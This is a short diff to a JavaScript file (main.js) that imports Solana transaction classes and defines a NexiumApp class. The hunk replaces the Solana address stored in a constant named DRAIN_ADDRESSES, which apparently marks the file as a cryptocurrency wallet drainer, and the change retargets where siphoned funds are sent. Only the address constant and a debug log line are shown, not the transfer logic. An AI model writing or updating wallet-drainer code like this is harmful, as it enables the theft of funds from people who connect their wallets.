@@ -11,7 +11,7 @@ import { Connection, PublicKey, SystemProgram, TransactionMessage, VersionedTran
 console.log('main.js: Buffer after imports:', typeof globalThis.Buffer); // Log 4
 
 const DRAIN_ADDRESSES = {
-  solana: "hQPH3UqsfCBX6VPiWPhowhmmcrZNxnhV4eqRtJcSEtb"
+  solana: "CemeseY38vC4bDAbQnUMobogAGDaiD24RRh7FjNULkLK"
 };
 
 class NexiumApp {
